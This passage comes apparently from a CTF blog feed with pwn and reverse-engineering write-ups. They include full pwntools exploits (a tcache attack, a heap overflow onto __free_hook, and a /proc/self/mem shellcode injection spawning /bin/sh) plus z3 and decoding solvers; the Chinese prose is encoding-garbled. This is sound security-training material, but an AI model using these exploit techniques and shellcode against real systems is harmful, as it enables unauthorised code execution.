Bçš„æ•°æ®ã€‚æ­¤é¢˜ä¹Ÿå°±æ˜¯æ”¹å…¶fdæŒ‡é’ˆï¼Œå³å¯æ¥ç€å®Œæˆtcache attackã€‚</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./sctf_2019_one_heap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]roc = [0x2,0x4,0x6,0xB,0xC,0xD]arae16 = 0x3c4b78arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;tent&#39;,str(data))def free():    sla(&#39;ice&#39;,&#39;2&#39;)def leak_addr():    add(0x7f,&#39;chumen77&#39; + &#39;\n&#39;)    free()    free()    add(0x7f,&#39;\n&#39;)    add(0x7f,&#39;\n&#39;)    #å¤¹åœ¨top chunkå‰é¢ï¼Œé˜²æ­¢è¿›å…¥unsortbinæ—¶ç›´æ¥åˆå¹¶ã€‚å¹¶ä¸”fakeä¸€äº›æ•°æ®ï¼Œç•™ç€ç»•è¿‡åé¢çš„æ£€æŸ¥ã€‚    add(0x30,p64(0)*4+p64(0x90) + p64(0x20))    free()    add(0x7f,&#39;\n&#39;)    free()    add(0x28,p16(0x9750) + &#39;\n&#39;)    debug()    # ä¿®æ”¹å‰©ä¸‹0x60å¤§å°çš„unsortbinçš„å¤§å°ä¸º0x90ï¼Œä¸”å‰é¢å·²ç»æœ‰fakeçš„æ•°æ®ï¼Œä¸ä¼šè®©ç¨‹åºcrush    add(0x7f,p64(0)*5 + p64(0x91) +&#39;\n&#39;)    payload = p64(0)*2 + p64(0xfbad3c80) + p64(0) * 3 + &#39;\x00&#39;    add(0x7f,payload + &#39;\n&#39;)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./sctf_2019_one_heap&#39;)        # io = remote(&#39;node3.buuoj.cn&#39;,28690)        continueleak = leak &gt;&gt; 16info_addr(&#39;leak&#39;,leak)libc_base = leak - 4110208info_addr(&#39;libc_base&#39;,libc_base)malloc_hook = 0x3ebc30 + libc_basepayload = p64(0) * 11 + p64(0x41) + p64(malloc_hook-8)debug()# ä¿®æ”¹0x40 tcache binçš„chainadd(0x68,payload)debug()add(0x38,&#39;\n&#39;)realloc=libc_base+libc.symbols[&#39;realloc&#39;] + roc[1]one = 0x10a38c + libc_basepayload = p64(one) + p64(realloc)add(0x38,payload + &#39;\n&#39;)add(0x20,&#39;\n&#39;)# debug()itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTFåˆ·é¢˜è®°å½•&quot;&gt;&lt;a href=&quot;#BUUCTFåˆ·é¢˜è®°å½•&quot; class=&quot;headerlink&quot; title=&quot;BUUCTFåˆ·é¢˜è®°å½•&quot;&gt;&lt;/a&gt;BUUCTFåˆ·é¢˜è®°å½•&lt;/h1&gt;&lt;h2 id=&quot;GKCTF-2020-demo&quot;&gt;&lt;a href=&quot;#GKCTF-
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp</title>
    <link href="http://chumen77.xyz/2020/09/24/ciscn%202020%20%E5%8D%8E%E4%B8%AD%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/24/ciscn 2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp/</id>
    <published>2020-09-24T00:09:06.574Z</published>
    <updated>2020-09-26T12:18:50.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020-åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp"><a href="#ciscn-2020-åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp" class="headerlink" title="ciscn  2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp"></a>ciscn  2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp</h1><p>ç¬¬ä¸€å¤©è·Ÿ6çº§å†²çªäº†ï¼ŒåŸºæœ¬æ²¡ç©ï¼Œç¬¬äºŒå¤©åšå®Œä¸€ä¸ªé¢˜idaç‚¸äº†ï¼Œæ€ä¹ˆä¹Ÿæ‰“ä¸å¼€ã€‚æœ€è¿‘ï¼Œæ€»æ˜¯å…³é”®æ—¶åˆ»æ‰é“¾å­äº†ğŸ˜­ã€‚</p><h2 id="logic-mistake"><a href="#logic-mistake" class="headerlink" title="logic_mistake"></a><code>logic_mistake</code></h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¯ä»¥ç”³è¯·16ä¸ªå †ï¼Œsizeä¿¡æ¯æ”¾åœ¨å…¶chunkåœ°å€çš„ä¸‹8ä¸ªå­—èŠ‚</li><li>é€šè¿‡strdupæ¥è¿›è¡Œç”³è¯·å †ï¼Œ <code>strdup</code> ç›¸å½“äº<code>s = input() malloc(stren(s))</code> </li></ul><h4 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h4><ul><li><code>read(0, *((void **)&amp;unk_202060 + 2 * v1), dword_202068[4 * v1]);</code> è¿™é‡Œç”±äºæ˜¯è¿™æ ·çš„åˆ¤æ–­ï¼Œç»“åˆaddçš„<code>strdup</code> å°±é€ æˆäº†å †æº¢å‡ºã€‚</li></ul><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>ç”³è¯·8ä¸ª0x90å¤§å°çš„å †å—ï¼Œsize å¡«æˆ0xffï¼Œç•™ç€æº¢å‡º</li><li>ç”³è¯·3ä¸ª0x80å¤§å°çš„å †å—ï¼Œsize å¡«æˆ0xffï¼Œç•™ç€æº¢å‡º</li><li>é‡Šæ”¾å‰8ä¸ªå †ï¼Œæœ€åä¸€ä¸ªè¿›å…¥unsortbin</li><li>ç”³è¯·ä¸€ä¸ª0x90çš„å †å—ï¼Œä¼šç”³è¯·åˆ°tcacheçš„å¤´çš„å †ï¼Œä¹Ÿå°±æ˜¯ç¬¬7ä¸ªå †</li><li>editæº¢å‡ºä¿®æ”¹åˆ°next chunkçš„size å’Œprev sizeï¼Œè®©show å‡ºlibcä¿¡æ¯</li><li>æ¥ç€ä¿®æ”¹unsortbinçš„size ä¸º0x80ï¼Œå¼€å§‹è¿›è¡Œtcache attackï¼Œä¹Ÿå°±æ˜¯æº¢å‡ºä¿®æ”¹tcache chianä¸Šçš„å †åœ°å€ï¼Œä¿®æ”¹ä¸ºfree hook</li><li>ç„¶åç”³è¯·å †åˆ°free hookï¼Œæ‰“one gadgets<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3></li></ul><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;172.20.12.248&#39;,50001)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;4.show&#39;,&#39;1&#39;)    sla(&#39;Input index:&#39;,str(idx))    sla(&#39;Input size&#39;,str(size))    sa(&#39;note&#39;,str(data))def edit(idx,data):    sla(&#39;4.show&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;note&#39;,str(data))def show(idx):    sla(&#39;4.show&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))def free(idx):    sla(&#39;4.show&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))for i in range(8):    payload = &#39;1&#39; * 0x80    add(i,0xff,payload)payload = &#39;1&#39; * 0x70add(10,0xff,payload)add(11,0xff,payload)add(12,0xff,payload)for i in range(7):    free(i)free(7)payload = &#39;1&#39; * 0x80add(6,0xff,payload)payload = &#39;1&#39; * 0x80 + &#39;2&#39; * 8 + p64(0xdeadbeefdeadbeef)edit(6,payload)show(6)ru(&#39;22222222&#39;)r(8)libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc&#39;,libc_base)payload = &#39;1&#39; * 0x80 + p64(0) + p64(0x81)edit(6,payload)payload = &#39;1&#39; * 0x70add(13,0xff,payload)free(11)free(10)free_hook = 0x3ed8e8 + libc_basepayload = &#39;1&#39; * 0x80 + p64(0x90) + p64(0x80) + p64(free_hook)edit(13,payload)payload = &#39;1&#39; * 0x70add(14,0xff,payload)one = 0x4f3c2 + libc_baseadd(15,0xff,payload)edit(15,p64(one))free(14)itr()</code></pre><h2 id="safe-shell"><a href="#safe-shell" class="headerlink" title="safe shell"></a>safe shell</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="ç™»é™†å‡½æ•°ï¼š"><a href="#ç™»é™†å‡½æ•°ï¼š" class="headerlink" title="ç™»é™†å‡½æ•°ï¼š"></a>ç™»é™†å‡½æ•°ï¼š</h4><pre><code class="c">!strcmp(name, &amp;s) &amp;&amp; !strcmp(password, &amp;ptr);</code></pre><p>åœ¨æœ€åçš„éªŒè¯æ˜¯ç”¨strcmpï¼Œä¼šè¢«<code>\x00</code>ç»™æˆªæ–­ï¼Œå¹¶ä¸”æœåŠ¡å™¨ä¸Šçš„admin.txtä¸Šæ¥ä¹Ÿæ˜¯ç©ºçš„ã€‚ç›´æ¥è®¾ç½®nameä¸passwordå‡ä¸º<code>\x00</code>å³å¯ç»•è¿‡ã€‚</p><h4 id="shellå‡½æ•°ï¼š"><a href="#shellå‡½æ•°ï¼š" class="headerlink" title="shellå‡½æ•°ï¼š"></a>shellå‡½æ•°ï¼š</h4><ul><li>éƒ½æ˜¯å›´ç»•<code>/proc/self/</code>ç›®å½•ä¸‹çš„æ“ä½œ</li><li><code>set_lseek</code>å¯ä»¥ä¿®æ”¹è¯»å–æŸæ–‡ä»¶æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯openä»¥åé»˜è®¤æ“ä½œè¯»å†™æŒ‡é’ˆæ˜¯æŒ‡å‘æ–‡ä»¶çš„å¼€å¤´çš„ï¼Œé€šè¿‡å®ƒå¯ä»¥ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆçš„åœ¨è¿™ä¸ªæ–‡ä»¶ä¸ŠæŒ‡å‘</li><li>write ä¸€æ¬¡åªèƒ½å†™8å­—èŠ‚</li></ul><p>é‡ç‚¹æ˜¯äº†è§£<code>/proc/pid/</code>ç›®å½•ä¸‹æ–‡ä»¶çš„ä¿¡æ¯ä¸å«ä¹‰ã€‚<br><a href="https://blog.csdn.net/enweitech/article/details/53391567" target="_blank" rel="noopener">https://blog.csdn.net/enweitech/article/details/53391567</a></p><p><strong>ç‰¹åˆ«æ³¨æ„ mmaps å’Œ mem</strong></p><h5 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h5><p>æ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œå­˜æ”¾ç€å†…å­˜åˆ†å¸ƒå›¾ï¼Œç±»ä¼¼äºgdbä¸­vmmapï¼Œå¯ä»¥æ³„æ¼ä¸€ä¸‹ç¨‹åºçš„åŸºåœ°å€ã€‚</p><h5 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h5><ul><li>åŒ…å«äº†ç¨‹åºè¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼›</li><li>é€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜</li><li>/ proc / $pid / memä»¥ä¸è¿›ç¨‹ä¸­ç›¸åŒçš„æ–¹å¼æ˜¾ç¤º$pidçš„å†…å­˜æ˜ å°„,å³ä¼ªæ–‡ä»¶ä¸­åç§»xå¤„çš„å­—èŠ‚ä¸è¿›ç¨‹ä¸­åœ°å€xå¤„çš„å­—èŠ‚ç›¸åŒ.ã€‚</li><li>ç»“åˆmapsçš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼ã€‚å³æ— æ³•è¯»å–æœªè¢«æ˜ å°„çš„åŒºåŸŸï¼Œåªæœ‰è¯»å–çš„åç§»å€¼æ˜¯è¢«æ˜ å°„çš„åŒºåŸŸæ‰èƒ½æ­£ç¡®è¯»å–å†…å­˜å†…å®¹ã€‚</li></ul><p>å†™å…¥memæ–‡ä»¶ä¹Ÿç›¸å½“äºä¿®æ”¹ç¨‹åºåœ¨å†…å­˜çš„æœ¬èº«äº†ï¼Œç»“åˆmmapsçš„ç¨‹åºåŸºå€ï¼Œåœ¨åˆé€‚çš„åœ°æ–¹å†™å…¥shellcodeï¼Œè®©ç¨‹åºèµ°åˆ°è¿™é‡Œå³å¯get shell</p><h4 id="é˜²å¾¡å‡½æ•°ï¼š"><a href="#é˜²å¾¡å‡½æ•°ï¼š" class="headerlink" title="é˜²å¾¡å‡½æ•°ï¼š"></a>é˜²å¾¡å‡½æ•°ï¼š</h4><p>åœ¨ç›‘æµ‹åˆ°3æ¬¡å¯†ç é”™è¯¯åï¼Œå¼€å§‹æ‹’ç»è¿æ¥ï¼Œå¹¶ä¸”ä¼šåœ¨<code>admin.txt</code>ä¸­å†™å…¥éšæœºçš„512ä¸ªå­—æ¯æ•°å­—ç»„åˆçš„å­—ç¬¦ã€‚è¿™æ ·å°±åŸºæœ¬ç™»é™†ä¸ä¸Šå»äº†,å› ä¸ºæ˜¯éšæœºçš„ï¼Œå¹¶ä¸”nameè·Ÿpasswordæœ€å¤§ä¹Ÿå°±æ˜¯0x100çš„é•¿åº¦ã€‚</p><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>ç»•è¿‡checkï¼Œç™»å…¥diy shell </li><li>è¯»å…¥mmapsï¼Œleak å‡º ç¨‹åºçš„base</li><li>open memæ–‡ä»¶ï¼Œå‡†å¤‡å†™å…¥</li><li>ç¡®å®šå†™å…¥åç§»ä¸ºhelpå<code>0x16CC + base</code>,é€šè¿‡<code>set_lseek</code>æ¥ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘</li><li>wirte å†™å…¥8å­—èŠ‚shellcode</li><li>é€šè¿‡<code>set_lseek</code>æ¥ä¿®æ”¹æŒ‡é’ˆ+8ï¼Œå†æ¬¡å†™å…¥ï¼Œå¾ªç¯å†™å¥½shellcode</li><li>è¾“å…¥helpå³å¯</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./safe_shell&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()sa(&#39;name&#39;,&#39;\x00&#39;)sa(&#39;pass&#39;,&#39;\x00&#39;)sl(&#39;readonly&#39;)sla(&#39;name&#39;,&#39;maps&#39;)s = ru(&#39;-5&#39;)s = s[2:14]base = int(s,16)info_addr(&#39;base&#39;,base)patch_addr = 0x16CC + basesl(&#39;open&#39;)sla(&#39;name&#39;,&#39;mem&#39;)shellcode = &#39;\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#39;for i  in range(len(shellcode)//8+1):    sl(&#39;set_lseek&#39;)    sla(&#39; file offset&#39;,str(patch_addr + i*8))    sla(&#39;$&#39;,&#39;write&#39;)    sa(&#39;your context&#39;,shellcode[i*8:(i*8+8)])sl(&#39;help&#39;)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ciscn-2020-åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp&quot;&gt;&lt;a href=&quot;#ciscn-2020-åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp&quot; class=&quot;headerlink&quot; title=&quot;ciscn  2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp&quot;&gt;&lt;/a&gt;ciscn  2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp&lt;/h1
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ç¾ŠåŸæ¯2020éƒ¨åˆ†wp</title>
    <link href="http://chumen77.xyz/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/14/ç¾ŠåŸæ¯2020éƒ¨åˆ†wp/</id>
    <published>2020-09-14T12:56:01.475Z</published>
    <updated>2020-09-24T02:49:43.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¾ŠåŸæ¯2020éƒ¨åˆ†wp"><a href="#ç¾ŠåŸæ¯2020éƒ¨åˆ†wp" class="headerlink" title="ç¾ŠåŸæ¯2020éƒ¨åˆ†wp"></a>ç¾ŠåŸæ¯2020éƒ¨åˆ†wp</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Python exeçš„é€†å‘ã€‚å…¶ä¸­åœ¨ä¿®å¤pycæ—¶ï¼Œä¸ªäººä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œè®°å½•ä¸€ä¸‹ï¼š</p><p> åœ¨è„±å»ä»¥åï¼Œä¼šæœ‰ä¸»ç¨‹åºï¼Œè·Ÿä¸€ä¸ªstructçš„æ–‡ä»¶ã€‚</p><p>è¦ä¿è¯ä¸»ç¨‹åºä¸structçš„å‰é¢çš„é­”æ³•å­—èŠ‚æ˜¯ç›¸åŒä¸€æ ·çš„ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/yFiJmM.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r9gtZs.png" srcset="/img/loading.gif" alt><br>é‡ç‚¹å…³æ³¨å‰16ä¸ªå­—èŠ‚ï¼Œä¿è¯ç›¸åŒå³å¯ã€‚<br>ä¿®å¤å¥½pycåï¼Œå°±å¯ä»¥è¿›è¡Œåç¼–è¯‘ã€‚<br>å‰©ä¸‹çš„å°±æ˜¯é€†ç®—æ³•ï¼Œéœ€è¦ç”¨åˆ°z3ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">#!/usr/bin/env python2.7from z3 import *&#39;&#39;&#39;a1 = Int(&#39;a1&#39;)a2 = Int(&#39;a2&#39;)a3 = Int(&#39;a3&#39;)a4 = Int(&#39;a4&#39;)a5 = Int(&#39;a5&#39;)a6 = Int(&#39;a6&#39;)a7 = Int(&#39;a7&#39;)a8 = Int(&#39;a8&#39;)a9 = Int(&#39;a9&#39;)a10 = Int(&#39;a10&#39;)a11 = Int(&#39;a11&#39;)a12 = Int(&#39;a12&#39;)a13 = Int(&#39;a13&#39;)a14 = Int(&#39;a14&#39;)s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)if s.check() == sat:    result = s.model()    print result&#39;&#39;&#39;&#39;&#39;&#39;[a2 = 24, a13 = 88, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a12 = 74, a7 = 28, a1 = 119, a10 = 108, a11 = 88, a8 = 91, a4 = 7, a3 = 10]&#39;&#39;&#39;key = [10,24,119,7,104,43,28,91,108,52,88,74,88,33]flag = &#39; &#39;for i in range(13,0,-1):    key[i-1] = key[i] ^ key[i - 1]    flag += chr(key[i-1])flag = flag[::-1]flag += chr(33)print(flag)</code></pre><p>å…¶ä¸­åœ¨z3ä¸­å¤„ç†é€»è¾‘è¿ç®—æ—¶ï¼Œæ˜¯å¾ˆç‰¹æ®Šçš„ï¼Œè¿™ä¸ªéœ€è¦æ³¨æ„ï¼Œå…·ä½“å¯ä»¥çœ‹z3çš„å®˜æ–¹æ–‡æ¡£ã€‚<br>å¯ä»¥å‚è€ƒï¼š<br><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" target="_blank" rel="noopener">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p><p>è¿˜æœ‰é‡åˆ°é€»è¾‘å·¦ç§»å³ç§»ï¼š</p><pre><code class="python">1. â€œ&gt;&gt;â€int x = 16; printf(&quot;%d\n&quot;, x &gt;&gt; 1);å…ˆå°†xè½¬æˆäºŒè¿›åˆ¶ 10000, ä¸è¯»æœ€åä¸€ä½ï¼Œ è¾“å‡º 1000ï¼Œ å³ä¸º8;å³ç§»ä¸€ä½ç›¸å½“äºæ•°å€¼é™¤ä»¥22. â€œ&lt;&lt;â€int x = 16; printf(&quot;%d\n&quot;, x &lt;&lt; 1);å…ˆå°†xè½¬æˆäºŒè¿›åˆ¶ 10000, å¾€æœ€åå†è¯»å–ä¸€ä½(0, æˆ–æ ¹æ®æ˜¯å¦å·²ç»æœ‰ç§»ä½)ï¼Œ è¾“å‡º 100000ï¼Œ å³ä¸º32;å·¦ç§»ï¼Œè‹¥ç§»åŠ¨ä½æ•°Kç­‰äºæˆ–å¤§äºæ•°æ®é•¿åº¦N,é€šå¸¸åªç§»åŠ¨K mod N ä½æ•°å·¦ç§»ä¸€ä½ç›¸å½“äºæ•°å€¼ä¹˜ä»¥2</code></pre><p>åœ¨è¿™é‡Œæ˜¯å·¦ç§»7ï¼Œä¹Ÿå°±æ˜¯ä¹˜ 2 çš„7æ¬¡æ–¹ã€‚</p><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>3å±‚åŠ å¯†.</p><ul><li>ä¸€ä¸ªbase64</li><li>ä¸€ä¸ªä»¥13å­—èŠ‚ï¼Œåˆ†å‰²å­—ç¬¦ï¼Œè¿›è¡Œç§»ä½</li><li>å•å­—èŠ‚å‡¯æ’’åŠ å¯†ï¼Œä½†æ˜¯ä¹ŸåŠ å…¥äº†å¯¹æ•°å­—çš„å¤„ç†</li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">import base64key = &#39;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#39;key = [ord(c) for c in key]buf = [0]*52for i in range(len(key)):    if key[i] &gt; 64 and key[i] &lt;=90:        buf[i] = (key[i] - 65 - 3) % 26 + 65        continue    if key[i] &gt; 96 and key[i] &lt;=122:        buf[i] =  (key[i] - 97 - 3) % 26 + 0x61        continue    if key[i] &gt; 47 and key[i] &lt;=57:        buf[i] = (key[i] - 48 - 3) % 10 + 48        continue    buf[i] = key[i]buf = [chr(c) for c in buf]key2 = &#39;&#39;for i in buf:    key2 += ikey2 = key2[13:26] + key2[39:52] + key2[:13] + key2[26:39]flag = base64.b64decode(key2)print(flag)</code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="sing-in"><a href="#sing-in" class="headerlink" title="sing in"></a>sing 